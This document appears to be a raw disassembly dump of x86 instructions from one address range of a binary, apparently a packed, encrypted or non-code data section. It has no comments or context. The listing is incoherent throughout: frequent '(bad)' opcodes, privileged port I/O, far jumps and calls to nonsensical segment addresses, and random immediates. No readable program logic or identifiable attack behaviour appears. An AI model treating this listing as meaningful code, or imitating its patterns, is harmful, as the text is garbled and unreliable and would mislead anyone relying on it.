  41524c:	out    0xea,al
  41524e:	stc    
  41524f:	jle    0x415268
  415251:	or     eax,0xc03b23fd
  415256:	cmp    ecx,DWORD PTR [esi]
  415258:	imul   esi,DWORD PTR [eax],0x7141c9de
  41525e:	sbb    cl,BYTE PTR [esi+0x37]
  415261:	out    0xe0,eax
  415263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415264:	and    BYTE PTR [ecx+0x0],0x3b
  415268:	push   eax
  415269:	ret    0xb47b
  41526c:	push   eax
  41526d:	jl     0x415223
  41526f:	(bad)  
  415270:	out    dx,eax
  415271:	test   eax,0xf1d18624
  415276:	pop    edx
  415277:	jmp    FWORD PTR [esi+0x5f]
  41527a:	(bad)  
  41527b:	iret   
  41527c:	adc    al,0xb3
  41527e:	retf   0xb532
  415281:	mov    ch,0xd3
  415283:	or     al,0x87
  415285:	pop    ebx
  415286:	mov    dl,0x85
  415288:	mov    cl,0xea
  41528a:	lahf   
  41528b:	fwait
  41528c:	ret    
  41528d:	es jne 0x41523a
  415290:	inc    dl
  415292:	rcl    BYTE PTR [esi],cl
  415294:	pop    ds
  415295:	mov    cl,0x21
  415297:	outs   dx,DWORD PTR ds:[esi]
  415298:	dec    ecx
  415299:	pavgb  mm5,QWORD PTR [eax+0x14b70ae2]
  4152a0:	fcmovne st,st(3)
  4152a2:	ds cs or dh,ch
  4152a6:	cwde   
  4152a7:	imul   ecx,DWORD PTR [edi+0x18],0xccafca34
  4152ae:	je     0x415230
  4152b0:	into   
  4152b1:	mov    ss,WORD PTR [eax+ebx*4]
  4152b4:	sbb    esi,DWORD PTR [ebx+eiz*1-0x769e5e13]
  4152bb:	frstor [edi+0x77]
  4152be:	xchg   ebx,eax
  4152bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152c1:	neg    BYTE PTR [ecx+0x63]
  4152c4:	jnp    0x4152b7
  4152c6:	div    DWORD PTR [ecx-0x732f1119]
  4152cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152cd:	xor    eax,0xf7a56aa3
  4152d2:	add    DWORD PTR [esi+0x6086bee],ecx
  4152d8:	dec    esp
  4152d9:	jb     0x41531e
  4152db:	sbb    ebx,DWORD PTR [ecx+edx*1]
  4152de:	repz bound ebx,QWORD PTR [eax-0x522a5c7d]
  4152e5:	shl    DWORD PTR [ebx+ebp*1-0x19],1
  4152e9:	xor    ch,BYTE PTR [ecx-0x66ceda88]
  4152ef:	popf   
  4152f0:	add    ah,BYTE PTR [edi+edx*4+0x102303c0]
  4152f7:	or     al,0xb1
  4152f9:	cmp    al,0x60
  4152fb:	fcom   DWORD PTR [ebp-0x2a7ee83a]
  415301:	inc    ebp
  415302:	repz push ecx
  415304:	ror    esi,0xec
  415307:	in     al,0x7
  415309:	shl    DWORD PTR [esi+eiz*8],1
  41530c:	pop    ss
  41530d:	imul   ecx,DWORD PTR [ebx-0x19402c8a],0x78
  415314:	ror    DWORD PTR [ebx+ebp*8+0x30eac521],cl
  41531b:	inc    edi
  41531c:	stos   DWORD PTR es:[edi],eax
  41531d:	mov    ebp,0x7af69a09
  415322:	repnz lahf 
  415324:	xchg   ecx,eax
  415325:	outs   dx,BYTE PTR ds:[esi]
  415326:	mov    edi,ecx
  415328:	test   eax,0x3f451cc9
  41532d:	cmp    DWORD PTR [eax+esi*8],edi
  415330:	sbb    BYTE PTR [edx+0x6b],0xd2
  415334:	scas   eax,DWORD PTR es:[edi]
  415335:	ret    
  415336:	jmp    0x4152b8
  415338:	add    al,0xbc
  41533a:	into   
  41533b:	in     eax,dx
  41533c:	js     0x41530f
  41533e:	fst    DWORD PTR [ecx+0x50e7ba0e]
  415344:	and    eax,0xaae54b00
  415349:	popa   
  41534a:	repnz imul ebx,ebx,0xa3c7948b
  415351:	and    BYTE PTR [ebp+ebx*4-0x3dc15109],dh
  415358:	dec    ecx
  415359:	in     eax,dx
  41535a:	add    eax,ebp
  41535c:	pushf  
  41535d:	adc    ch,dh
  41535f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415360:	arpl   WORD PTR [ebx+edi*4-0x744f704b],bp
  415367:	and    ebx,DWORD PTR [eax+0x2e]
  41536a:	cmp    esi,DWORD PTR [edi-0x608386a3]
  415370:	fisubr DWORD PTR [eax-0x2a908f89]
  415376:	push   0xffffff8c
  415378:	pop    esp
  415379:	adc    al,BYTE PTR [edi]
  41537b:	popa   
  41537c:	lods   eax,DWORD PTR ds:[esi]
  41537d:	call   0x6750:0x6430729c
  415384:	loope  0x4153d8
  415386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415387:	mov    dl,0x9
  415389:	data16 jns 0x415357
  41538c:	jb     0x4153a9
  41538e:	jp     0x41540f
  415390:	adc    BYTE PTR [edi],ah
  415392:	or     eax,0x5e9a75b6
  415397:	ds sub eax,0xb5482c16
  41539d:	adc    ecx,edi
  41539f:	inc    esi
  4153a0:	add    al,0x33
  4153a2:	or     DWORD PTR [edx+0x3a],edi
  4153a5:	je     0x41536f
  4153a7:	popa   
  4153a8:	adc    eax,0x250f2e07
  4153ad:	dec    edx
  4153ae:	dec    ecx
  4153af:	js     0x4153be
  4153b1:	mov    WORD PTR [edx-0x6f],?
  4153b4:	out    dx,al
  4153b5:	or     ch,BYTE PTR [ecx+0x7b]
  4153b8:	jl     0x4153f5
  4153ba:	ins    BYTE PTR es:[edi],dx
  4153bb:	aas    
  4153bc:	dec    esi
  4153bd:	aas    
  4153be:	xor    esi,DWORD PTR [ebx-0x35]
  4153c1:	loop   0x415380
  4153c3:	rol    DWORD PTR [esi-0x5a],cl
  4153c6:	pop    ss
  4153c7:	cmp    BYTE PTR [ecx-0x79],ch
  4153ca:	and    esi,DWORD PTR [esi+0x30efaff7]
  4153d0:	pop    ecx
  4153d1:	sbb    al,0x7b
  4153d3:	add    DWORD PTR [eax+ebx*1],ebp
  4153d6:	(bad)  
  4153d7:	fist   DWORD PTR ss:[ebx+eiz*1-0x43]
  4153dc:	or     BYTE PTR [eax],cl
  4153de:	xchg   DWORD PTR [ebx-0x5b95002],eax
  4153e4:	repz mov ds:0xdebdf592,al
  4153ea:	fisubr WORD PTR [edi]
  4153ec:	mov    al,ds:0xe7e7ef27
  4153f1:	in     eax,dx
  4153f2:	lds    esp,FWORD PTR [edi+0x69]
  4153f5:	sbb    dh,cl
  4153f7:	jbe    0x4153af
  4153f9:	adc    al,0x92
  4153fb:	mov    eax,ds:0x37484259
  415400:	inc    ecx
  415401:	fwait
  415402:	retf   
  415403:	retf   
  415404:	jg     0x415439
  415406:	sub    DWORD PTR [eax-0x62],eax
  415409:	and    bl,bh
  41540b:	sub    cl,BYTE PTR [eax+esi*2+0x50fd0430]
  415412:	adc    DWORD PTR [ecx-0xfe5b8a0],0xffffffda
  415419:	push   esi
  41541a:	pop    edi
  41541b:	jne    0x4153b8
  41541d:	les    ecx,FWORD PTR [ecx]
  41541f:	jle    0x4153b9
  415421:	sub    al,0x79
  415423:	aaa    
  415424:	clc    
  415425:	(bad)  
  415426:	push   eax
  415427:	sub    al,0xfb
  415429:	rcr    DWORD PTR [edx],cl
  41542b:	ror    ecx,1
  41542d:	mov    DWORD PTR [ebx],edi
  41542f:	(bad)  
  415430:	sti    
  415431:	jp     0x4153ee
  415433:	fcom   DWORD PTR [esi-0x37]
  415436:	fisttp WORD PTR [eax+0x15]
  415439:	fsub   DWORD PTR [ecx+0x5]
  41543c:	ja     0x41541e
  41543e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41543f:	mov    esi,0x5519a8d9
  415444:	and    bh,BYTE PTR [esi+0x6a]
  415447:	test   BYTE PTR [ebx+0x64],0x7a
  41544b:	sbb    al,0x8f
  41544d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544e:	pop    edx
  41544f:	pop    ss
  415450:	mov    al,ds:0x6d12d919
  415455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415456:	sbb    eax,0xdfe78bef
  41545b:	dec    edx
  41545c:	jp     0x4154a9
  41545e:	outs   dx,DWORD PTR ds:[esi]
  41545f:	mov    dl,0xe7
  415461:	lock lea edi,[bp+si]
  415465:	loope  0x41546b
  415467:	in     al,dx
  415468:	jns    0x415493
  41546a:	scas   eax,DWORD PTR es:[edi]
  41546b:	dec    eax
  41546c:	cmp    esp,DWORD PTR [edi]
  41546e:	arpl   WORD PTR [ebp+0x76],cx
  415471:	das    
  415472:	mov    bl,0xce
  415474:	or     ch,BYTE PTR [ebp+0x56]
  415477:	mov    ecx,DWORD PTR [edx-0x3e6bfe65]
  41547d:	rcl    DWORD PTR [ebp-0xf933e75],cl
  415483:	ins    BYTE PTR es:[edi],dx
  415484:	pop    eax
  415485:	ins    DWORD PTR es:[edi],dx
  415486:	jae    0x4154a8
  415488:	outs   dx,BYTE PTR ds:[esi]
  415489:	neg    edx
  41548b:	jo     0x4154ba
  41548d:	mov    ebx,DWORD PTR [ebp-0x71]
  415490:	dec    ecx
  415491:	outs   dx,DWORD PTR ds:[esi]
  415492:	vmwrite esp,DWORD PTR [esi+0x8]
  415496:	mov    ch,0x58
  415498:	push   ss
  415499:	mov    dl,0x77
  41549b:	(bad)  
  41549c:	shl    BYTE PTR ds:0xca20ac67,1
  4154a2:	rol    BYTE PTR ds:0xfda085e7,1
  4154a8:	je     0x41547f
  4154aa:	pop    ebp
  4154ab:	inc    ecx
  4154ac:	aas    
  4154ad:	pop    ss
  4154ae:	jp     0x41546e
  4154b0:	mov    BYTE PTR [ecx],bl
  4154b2:	pop    ecx
  4154b3:	imul   ebx,DWORD PTR ds:[eax+0x38],0x44839ec8
  4154bb:	in     eax,0x28
  4154bd:	xchg   ebx,eax
  4154be:	inc    eax
  4154bf:	loope  0x415441
  4154c1:	cmp    al,0xb5
  4154c3:	jge    0x415497
  4154c5:	stos   BYTE PTR es:[edi],al
  4154c6:	in     eax,dx
  4154c7:	ins    DWORD PTR es:[edi],dx
  4154c8:	or     DWORD PTR [edx-0x17],0x56
  4154cc:	dec    edi
  4154cd:	in     eax,0xf0
  4154cf:	jecxz  0x4154db
  4154d1:	dec    ecx
  4154d2:	popa   
  4154d3:	(bad)  
  4154d4:	or     dl,BYTE PTR [ecx]
  4154d6:	shl    DWORD PTR [eax-0x5df826ce],1
  4154dc:	(bad)  
  4154dd:	aas    
  4154de:	ins    DWORD PTR es:[edi],dx
  4154df:	mov    bh,0xf7
  4154e1:	cmc    
  4154e2:	ins    BYTE PTR es:[edi],dx
  4154e3:	xchg   esi,eax
  4154e4:	into   
  4154e5:	xchg   ecx,eax
  4154e6:	sbb    ecx,DWORD PTR [ebp-0x7668f504]
  4154ec:	int3   
  4154ed:	sub    BYTE PTR [edi-0x1],0xb6
  4154f1:	clc    
  4154f2:	inc    ebx
  4154f3:	mov    eax,0x9d918c24
  4154f8:	pop    es
  4154f9:	sub    eax,0xaefeb9c9
  4154fe:	fld    QWORD PTR [esp+edi*4]
  415501:	xor    cl,BYTE PTR ds:0xa7012462
  415507:	mov    ds:0xe84cde39,eax
  41550c:	std    
  41550d:	imul   ebx,DWORD PTR [eax-0x1504a36b],0xd48dce2
  415517:	(bad)  
  415518:	cmp    al,0xad
  41551a:	mov    DWORD PTR ds:0x3520fe42,eax
  415520:	sbb    eax,0xbaa5817e
  415525:	mov    WORD PTR [esp+eax*2-0x4cc9b7aa],gs
  41552c:	add    edi,0x91e3cacb
  415532:	fwait
  415533:	pop    ebp
  415534:	loopne 0x415523
  415536:	inc    BYTE PTR [esi]
  415538:	test   esi,ebp
  41553a:	mov    al,ds:0x5445ce04
  41553f:	stos   BYTE PTR es:[di],al
  415541:	xchg   esp,eax
  415542:	loop   0x415593
  415544:	inc    ebp
  415545:	icebp  
  415546:	retf   
  415547:	lods   al,BYTE PTR ds:[esi]
  415548:	push   ebp
  415549:	pusha  
  41554a:	xchg   al,al
  41554c:	and    dh,bh
  41554e:	mov    WORD PTR [ecx],gs
  415550:	xchg   BYTE PTR [ecx+0x1aa49fc7],ch
  415556:	inc    ebx
  415557:	mov    ebp,0x4a9a51b5
  41555c:	cwde   
  41555d:	or     esi,DWORD PTR [esi-0x45798654]
  415563:	cs sar ecx,cl
  415566:	push   edi
  415567:	neg    BYTE PTR ds:0x30bde281
  41556d:	mov    bl,BYTE PTR [ebx-0x179ae48b]
  415573:	frstor [ebp-0x4c3e907e]
  415579:	mov    esi,0xd3d5a3cb
  41557e:	imul   eax,DWORD PTR [edi+0x6515e2b7],0xb57feb9f
  415588:	stos   DWORD PTR es:[edi],eax
  415589:	ins    BYTE PTR es:[edi],dx
  41558a:	cld    
  41558b:	jae    0x4155de
  41558d:	cmp    al,0xd6
  41558f:	shr    BYTE PTR [esi],cl
  415591:	lods   eax,DWORD PTR ds:[esi]
  415592:	adc    bh,BYTE PTR [esi+0x7d]
  415595:	xchg   edx,eax
  415596:	add    ebp,DWORD PTR [esi+0xe205457]
  41559c:	ret    0xd775
  41559f:	push   ebp
  4155a0:	and    esi,DWORD PTR [eax+ebp*2+0x7]
  4155a4:	sahf   
  4155a5:	sbb    ch,BYTE PTR [edx+ecx*2]
  4155a8:	push   eax
  4155a9:	xchg   esp,eax
  4155aa:	not    al
  4155ac:	into   
  4155ad:	adc    DWORD PTR [eax],edx
  4155af:	pop    ecx
  4155b0:	adc    cl,0xd9
  4155b3:	jge    0x4155db
  4155b5:	enter  0x838,0x61
  4155b9:	mov    ecx,0x6c2d7f03
  4155be:	dec    edi
  4155bf:	aaa    
  4155c0:	aas    
  4155c1:	(bad)  
  4155c3:	or     ch,cl
  4155c5:	pop    ecx
  4155c6:	and    esi,DWORD PTR [esi+0x6a166fd1]
  4155cc:	push   esi
  4155cd:	data16 lahf 
  4155cf:	cwde   
  4155d0:	mov    ds:0xe7737e7,eax
  4155d5:	shl    DWORD PTR [eax],1
  4155d7:	mov    WORD PTR [edx],gs
  4155d9:	lods   al,BYTE PTR ds:[esi]
  4155da:	mov    eax,ds:0x44c3e5f8
  4155df:	mov    bh,0x30
  4155e1:	in     al,dx
  4155e2:	add    eax,0xc0f59290
  4155e7:	jecxz  0x4155a6
  4155e9:	mov    dl,0x33
  4155eb:	nop
  4155ec:	jnp    0x415661
  4155ee:	loop   0x4155a0
  4155f0:	sbb    al,0x8
  4155f2:	leave  
  4155f3:	(bad)  
  4155f4:	sub    DWORD PTR [ebx-0x1e],ebx
  4155f7:	xchg   esi,eax
  4155f8:	fwait
  4155f9:	or     cl,BYTE PTR [edi-0x40]
  4155fc:	adc    esi,esp
  4155fe:	or     bh,al
  415600:	pop    eax
  415601:	out    dx,al
  415602:	scas   eax,DWORD PTR es:[edi]
  415603:	bound  eax,QWORD PTR [edi]
  415605:	xchg   ebx,ebx
  415607:	ror    DWORD PTR [ebx],cl
  415609:	jp     0x415665
  41560b:	scas   eax,DWORD PTR es:[edi]
  41560c:	mov    ebp,0x47c0fcca
  415611:	push   edx
  415612:	push   esi
  415613:	inc    esp
  415614:	enter  0xe90e,0xa2
  415618:	jae    0x415626
  41561a:	pop    esp
  41561b:	xor    dh,BYTE PTR [ecx+0x313d9eb0]
  415621:	in     al,0xc0
  415623:	cmp    ecx,DWORD PTR [edi+0x60cac02c]
  415629:	outs   dx,BYTE PTR ds:[esi]
  41562a:	inc    edi
  41562b:	jg     0x4155d7
  41562d:	mov    ds:0x37c8e48e,eax
  415632:	dec    edx
  415633:	paddb  mm4,QWORD PTR [edx-0x5c1d73cf]
  41563a:	pop    esp
  41563b:	push   0x3e53548a
  415640:	shr    DWORD PTR [edx+0x2fb2b8c2],1
  415646:	call   DWORD PTR [ebx+0x6a5c970c]
  41564c:	cmp    DWORD PTR [esp+ebp*1],ebx
  41564f:	push   esi
  415650:	dec    esi
  415651:	adc    eax,0xe7f835
  415656:	xor    BYTE PTR [ebx+edi*4-0x53],cl
  41565a:	cmp    edi,DWORD PTR [esi+ecx*2+0x34]
  41565e:	dec    ecx
  41565f:	pop    ecx
  415660:	dec    edi
  415661:	push   esi
  415662:	jmp    0x415642
  415664:	xchg   DWORD PTR [edi],ebp
  415666:	adc    BYTE PTR [edx+0xc],0x9c
  41566a:	shl    DWORD PTR [ebx+0xa7febf5],cl
  415670:	dec    edi
  415671:	icebp  
  415672:	push   es
  415673:	or     dl,BYTE PTR [ebx+0x7d077cc]
  415679:	mov    edi,0xf43587ed
  41567e:	mov    ecx,0x4524c9a
  415683:	xchg   ebx,eax
  415684:	nop
  415685:	mov    ch,0xa0
  415687:	inc    edx
  415688:	or     DWORD PTR [edi],ebp
  41568a:	add    al,0xe3
  41568c:	aam    0x1d
  41568e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41568f:	mov    edx,edi
  415691:	jne    0x4156fe
  415693:	xchg   ecx,eax
  415694:	or     eax,0x5ca5cc5f
  415699:	mov    ebp,0x93c750c0
  41569e:	int3   
  41569f:	ja     0xae48e1b6
  4156a5:	cld    
  4156a6:	ja     0x415721
  4156a8:	mov    DWORD PTR [edx-0xaf16738],edx
  4156ae:	mov    ch,0x40
  4156b0:	adc    eax,0x89c3fba7
  4156b5:	out    dx,al
  4156b6:	push   edx
  4156b7:	add    al,0xb5
  4156b9:	ins    DWORD PTR es:[edi],dx
  4156ba:	inc    esi
  4156bb:	and    esp,DWORD PTR [eax]
  4156bd:	and    ebp,DWORD PTR [ebp+edx*2+0x4a449f4c]
  4156c4:	lahf   
  4156c5:	repz sub ecx,DWORD PTR [ebx-0x7d2bca4b]
  4156cc:	push   es
  4156cd:	jns    0x415692
  4156cf:	inc    esi
  4156d0:	push   cs
  4156d1:	leave  
  4156d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d3:	add    bh,BYTE PTR [esi]
  4156d5:	dec    ecx
  4156d6:	inc    edx
  4156d7:	inc    eax
  4156d8:	xor    al,0x1c
  4156da:	mov    ds:0x66fa8eb0,al
  4156df:	and    BYTE PTR [ebp+0x400a2d85],dl
  4156e5:	dec    ebp
  4156e6:	sbb    edx,DWORD PTR [eax+0x23]
  4156e9:	sbb    dl,dl
  4156eb:	lahf   
  4156ec:	cli    
  4156ed:	xchg   ecx,eax
  4156ee:	jge    0x41573d
  4156f0:	loope  0x415768
  4156f2:	dec    esi
  4156f3:	jnp    0x4156b7
  4156f5:	or     BYTE PTR [ebp+0x62ed751],0xd1
  4156fc:	dec    esi
  4156fd:	leave  
  4156fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ff:	inc    esi
  415700:	int    0x90
  415702:	sar    BYTE PTR [edi-0x57502ea0],0x9a
  415709:	push   esp
  41570a:	cmp    eax,0x10fbbedc
  41570f:	out    dx,eax
  415710:	cli    
  415711:	cwde   
  415712:	mov    al,BYTE PTR [eax+0xc]
  415715:	scas   al,BYTE PTR es:[edi]
  415716:	out    dx,al
  415717:	lahf   
  415718:	ret    
  415719:	add    esi,DWORD PTR [bp+0x76e0]
  41571e:	lods   al,BYTE PTR ds:[esi]
  41571f:	outs   dx,BYTE PTR ds:[esi]
  415720:	sbb    BYTE PTR [eax-0x10],bh
  415723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415724:	adc    dl,BYTE PTR [edx+esi*8-0x66230cc1]
  41572b:	out    dx,al
  41572c:	sub    eax,0x4ad94518
  415731:	outs   dx,DWORD PTR ds:[esi]
  415732:	xchg   edx,eax
  415733:	out    0xf4,al
  415735:	sub    BYTE PTR [ebx+ecx*8+0x230096f5],0x5c
  41573d:	mov    al,ds:0xa48e0fca
  415742:	xor    DWORD PTR [ecx+0x29293d6b],0xb1cde7ee
  41574c:	in     eax,0xef
  41574e:	push   ebp
  41574f:	(bad)  
  415750:	mov    esi,0xbd514a13
  415755:	jmp    0x41579b
  415757:	cwde   
  415758:	or     eax,0xf1648ed0
  41575d:	push   edi
  41575e:	pop    esi
  41575f:	adc    dh,BYTE PTR [ebx-0x7b05764e]
  415765:	lahf   
  415766:	and    al,0x4c
  415768:	adc    eax,0x76d5750
  41576d:	xor    al,0x34
  41576f:	in     al,dx
  415770:	pop    ds
  415771:	inc    esp
  415772:	adc    edi,DWORD PTR [esi+edi*4]
  415775:	adc    DWORD PTR [ebp+0x22],ecx
  415778:	ret    
  415779:	enter  0x861e,0x3b
  41577d:	cwde   
  41577e:	es jmp 0xcdad:0x71a865b1
  415786:	sbb    BYTE PTR [eax-0x27],dl
  415789:	sub    BYTE PTR [eax+0x296ae342],0xb7
  415790:	leave  
  415791:	jnp    0x415748
  415793:	lods   al,BYTE PTR ds:[esi]
  415794:	pop    ebp
  415795:	xor    al,0x4f
  415797:	enter  0x88bb,0xd1
  41579b:	sahf   
  41579c:	jecxz  0x415737
  41579e:	pushf  
  41579f:	nop
  4157a0:	adc    ebx,DWORD PTR [ebx-0x375cfdba]
  4157a6:	mov    ds:0x2796531a,eax
  4157ab:	ins    DWORD PTR es:[edi],dx
  4157ac:	aaa    
  4157ad:	jne    0x4157ca
  4157af:	sbb    eax,0x19242d50
  4157b4:	mov    eax,0x98b77087
  4157b9:	inc    eax
  4157ba:	rcr    BYTE PTR [ebp+0x32],0x3f
  4157be:	ins    DWORD PTR es:[edi],dx
  4157bf:	fnstsw WORD PTR [eax+0x1a]
  4157c2:	sahf   
  4157c3:	push   0x69
  4157c5:	jno    0x41578c
  4157c7:	lds    esp,FWORD PTR [edi+0x568a9175]
  4157cd:	sub    BYTE PTR [eax-0x19],cl
  4157d0:	inc    ebp
  4157d1:	repz or DWORD PTR [ebx+0x3b],ebp
  4157d5:	aas    
  4157d6:	mov    edx,0xd8c33e62
  4157db:	test   edx,eax
  4157dd:	jp     0x415789
  4157df:	(bad)  
  4157e3:	shl    BYTE PTR [edx-0x31],0x3b
  4157e7:	gs inc ebp
  4157e9:	pop    ebx
  4157ea:	xor    al,0xec
  4157ec:	cdq    
  4157ed:	clc    
  4157ee:	push   cs
  4157ef:	pop    eax
  4157f0:	fisub  WORD PTR [ebp+0x63]
  4157f3:	inc    esp
  4157f4:	mov    edi,0x528ebbfd
  4157f9:	in     al,dx
  4157fa:	stos   BYTE PTR es:[edi],al
  4157fb:	test   dh,al
  4157fd:	enter  0xeb82,0x47
  415801:	(bad)  
  415802:	sbb    BYTE PTR [esi+0x71],dh
  415805:	add    DWORD PTR [ecx],edi
  415807:	stos   DWORD PTR es:[edi],eax
  415808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415809:	ins    DWORD PTR es:[edi],dx
  41580a:	ror    esp,1
  41580c:	sti    
  41580d:	sti    
  41580e:	push   0xffffffe6
  415810:	cmp    DWORD PTR [edx-0x73962d70],ecx
  415816:	neg    dh
  415818:	cmc    
  415819:	jp     0x415836
  41581b:	xchg   ebp,eax
  41581d:	iret   
  41581e:	ja     0x41589e
  415820:	inc    ebp
  415821:	test   edx,0x357c5a41
  415827:	dec    esi
  415828:	in     eax,dx
  415829:	sbb    eax,0x2b7a7d59
  41582e:	pop    esp
  41582f:	ret    0xc596
  415832:	into   
  415833:	xchg   esp,eax
  415834:	out    0x38,eax
  415836:	xor    eax,ecx
  415838:	das    
  415839:	sub    esi,DWORD PTR es:[edx+eax*2+0x5a]
  41583e:	mov    bl,0x7b
  415840:	sub    eax,0xd3ef8f7b
  415845:	mov    al,ds:0x593b3224
  41584a:	mov    ch,BYTE PTR [edi+0x17]
  41584d:	fwait
  41584e:	imul   edi,ebp,0xffffffbe
  415851:	xlat   BYTE PTR ds:[ebx]
  415852:	cmp    esi,DWORD PTR [ebp-0x77]
  415855:	jle    0x4158a6
  415857:	fmulp  st(6),st
  415859:	inc    edx
  41585a:	mov    edx,0xe122dc76
  41585f:	iret   
  415860:	fcmovne st,st(4)
  415862:	inc    eax
  415863:	jl     0x4158d8
  415865:	test   DWORD PTR [edx+0x71],esi
  415868:	adc    BYTE PTR [ebp+eax*4-0x76],al
  41586c:	call   0x4c55b35b
  415871:	call   0xb4ef416f
  415876:	aam    0x80
  415878:	dec    eax
  415879:	fisttp WORD PTR [ebx+ebx*8]
  41587c:	cmp    al,0x17
  41587e:	fmul   QWORD PTR [eax]
  415880:	xchg   ecx,eax
  415881:	mov    eax,0xd6a33982
  415886:	aad    0xf2
  415888:	or     DWORD PTR [edx+0x25de66b7],0x4e8a0f46
  415892:	je     0x4158a0
  415894:	mov    ebp,DWORD PTR [ecx-0x48f325dc]
  41589a:	push   edx
  41589b:	fmul   QWORD PTR [ebp-0x13]
  41589e:	daa    
  41589f:	mov    al,ds:0xe181638e
  4158a4:	jmp    0x415912
  4158a6:	mov    esp,0xa99549fa
  4158ab:	int    0x5d
  4158ad:	dec    esi
  4158ae:	pop    edi
  4158af:	dec    dx
  4158b1:	xor    ch,bh
  4158b3:	ins    BYTE PTR es:[edi],dx
  4158b4:	or     BYTE PTR [edi+0x21],0xba
  4158b8:	cmp    dh,bl
  4158ba:	push   esi
  4158bb:	pop    ss
  4158bc:	fnstcw WORD PTR [edx+0x550a4b50]
  4158c2:	ss retf 0x3326
  4158c6:	sbb    al,0x30
  4158c8:	mov    al,0xa0
  4158ca:	jmp    0x94a8:0x6c464efe
  4158d1:	adc    BYTE PTR [edi-0x2b],0x41
  4158d5:	out    0x86,al
  4158d7:	fsincos 
  4158d9:	lea    ebp,[ecx+0x3783adb7]
  4158df:	stc    
  4158e0:	scas   eax,DWORD PTR es:[edi]
  4158e1:	jne    0x415892
  4158e3:	dec    edx
  4158e4:	xchg   esp,eax
  4158e5:	inc    esi
  4158e6:	push   edx
  4158e7:	fadd   QWORD PTR [eax-0x4f664583]
  4158ed:	mov    cl,0x9b
  4158ef:	cmp    BYTE PTR [esi-0x16],cl
  4158f2:	and    DWORD PTR [eax],ecx
  4158f4:	(bad)  [eax+0x17f8056]
  4158fa:	cmp    al,0x32
  4158fc:	add    eax,0xbc6fc268
  415901:	pop    edx
  415902:	out    dx,eax
  415903:	cmp    cl,BYTE PTR [edi-0x398f66d5]
  415909:	add    ebx,DWORD PTR [ebp+0x5c60778d]
  41590f:	int3   
  415910:	and    DWORD PTR [eax+ebx*8],esp
  415913:	cmp    bh,dh
  415915:	mov    ?,WORD PTR [edi-0x1693fd02]
  41591b:	dec    edx
  41591c:	push   ss
  41591d:	test   ebp,0x51eae5e6
  415923:	ins    BYTE PTR es:[edi],dx
  415924:	popf   
  415925:	mov    al,ds:0x9dbaa114
  41592a:	rcl    ebp,1
  41592c:	ret    
  41592d:	or     bh,BYTE PTR [eax-0x32]
  415930:	(bad)  
  415931:	xor    al,0xf6
  415933:	adc    ch,0xcd
  415936:	dec    ecx
  415937:	rcl    edx,1
  415939:	cmp    eax,0x295e7754
  41593e:	xor    DWORD PTR [ecx-0x1c],ebp
  415941:	inc    ebp
  415942:	add    al,0x84
  415944:	cmp    ch,ah
  415946:	fs cdq 
  415948:	addr16 test al,0x7a
  41594b:	pop    ecx
  41594c:	scas   al,BYTE PTR es:[edi]
  41594d:	and    DWORD PTR [edx-0x21],esi
  415950:	jg     0x4159b3
  415952:	push   esi
  415953:	sar    DWORD PTR [ebx+0x12d43cfc],1
  415959:	loope  0x41595d
  41595b:	inc    ebx
  41595c:	iret   
  41595d:	lea    ebp,[edi]
  41595f:	daa    
  415960:	mov    eax,ds:0x6cf0a3a
  415965:	lods   al,BYTE PTR ds:[esi]
  415966:	ret    
  415967:	mov    esi,0x68e002f4
  41596c:	stos   DWORD PTR es:[edi],eax
  41596d:	das    
  41596e:	xchg   edi,eax
  41596f:	xchg   edi,eax
  415970:	xor    al,0x9a
  415972:	and    eax,0x35c3db7c
  415977:	inc    edx
  415978:	mov    bh,0x4b
  41597a:	(bad)  
  41597b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41597c:	and    dl,0x90
  41597f:	jmp    0x13d41dc9
  415984:	pop    esp
  415985:	lock push cs
  415987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415988:	jg     0x415927
  41598a:	sbb    BYTE PTR [edi-0x7ba41ed5],cl
  415990:	std    
  415991:	inc    ebx
  415992:	aas    
  415993:	test   al,0x81
  415995:	mov    ebp,0x2bcd4924
  41599a:	pop    esp
  41599b:	into   
  41599c:	ja     0x4159bf
  41599e:	mov    bl,0xf6
  4159a0:	call   0x4080:0xc26ddd0c
  4159a7:	into   
  4159a8:	pop    edi
  4159a9:	cli    
  4159aa:	shr    BYTE PTR [edx-0x901891c],cl
  4159b0:	mov    ds:0x3a529229,al
  4159b5:	dec    BYTE PTR [ebx-0x781d73b1]
  4159bb:	(bad)  
  4159bc:	ss dec ebp
  4159be:	lds    edx,FWORD PTR [edx]
  4159c0:	lods   al,BYTE PTR ds:[esi]
  4159c1:	rcl    BYTE PTR [ecx-0x68],1
  4159c4:	lods   al,BYTE PTR ds:[esi]
  4159c5:	mov    ecx,0x3b3c5851
  4159ca:	jb     0x41596f
  4159cc:	ror    DWORD PTR [ecx-0x46f5008d],0xc6
  4159d3:	jmp    0x3bfa8962
  4159d8:	idiv   BYTE PTR [edi+0x57b1e136]
  4159de:	and    DWORD PTR [eax+ebx*2+0x41],eax
  4159e2:	pop    ebx
  4159e3:	ins    BYTE PTR es:[edi],dx
  4159e4:	sbb    edx,DWORD PTR [edi-0x2d]
  4159e7:	mov    eax,0xa830b94d
  4159ec:	iret   
  4159ed:	jns    0x415a6d
  4159ef:	add    DWORD PTR [edx-0x11d36e65],ecx
  4159f5:	or     eax,0xb774a723
  4159fa:	stos   DWORD PTR es:[edi],eax
  4159fb:	jmp    0x415a53
  4159fd:	pop    ecx
  4159fe:	hlt    
  4159ff:	mov    ch,0xa
  415a01:	add    dl,dh
  415a03:	sbb    DWORD PTR [ecx-0x5c],0x7cb93b1d
